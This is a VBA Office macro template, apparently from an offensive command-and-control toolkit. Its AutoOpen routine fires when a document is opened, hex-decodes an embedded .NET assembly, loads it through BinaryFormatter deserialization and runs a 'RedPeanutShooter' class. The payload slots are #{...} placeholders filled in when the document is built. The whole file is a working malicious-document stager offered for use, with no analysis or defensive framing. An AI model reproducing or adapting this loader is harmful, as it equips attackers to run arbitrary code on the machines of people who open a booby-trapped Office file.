Sub SetVersion
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
End Sub


Sub AutoOpen()
  #{runcode}
End Sub

Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.DataType = "bin.hex"
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function #{runcode}()

    SetVersion

    Dim #{assembly}
    #{hexassembly}

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")
    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set al = CreateObject("System.Collections.ArrayList")

    Dim dec
    dec = decodeHex(#{assembly})

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance("RedPeanutShooter")
    o.Execute

end function
